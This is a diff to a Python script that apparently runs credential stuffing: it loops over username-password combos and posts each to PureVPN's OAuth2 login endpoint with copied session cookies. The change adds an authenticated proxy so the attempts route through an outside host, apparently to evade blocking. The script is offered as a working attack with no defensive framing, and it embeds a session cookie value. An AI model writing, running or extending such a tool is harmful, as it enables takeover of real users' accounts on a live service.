@@ -1,5 +1,11 @@
 import requests
 
+# Proxy configuration
+proxies = {
+    'http': 'http://levetche:levetche@zxo.run.place:6969',
+    'https': 'http://levetche:levetche@zxo.run.place:6969',
+}
+
 cookies = {
     'fusionauth.timezone': 'Asia/Calcutta',
     'fusionauth.sso': 'AtZzqXza-QC3NlMl30tz6RvA43eMFJ0b6H_ewRD_qzO4',
@@ -71,7 +77,7 @@ for combo in combos:
     data['password'] = password
     
     # Make the request
-    response = requests.post('https://auth.purevpn.com/oauth2/authorize', cookies=cookies, headers=headers, data=data)
+    response = requests.post('https://auth.purevpn.com/oauth2/authorize', cookies=cookies, headers=headers, data=data, proxies=proxies)
     
     # Get the response HTML
     html_content = response.text
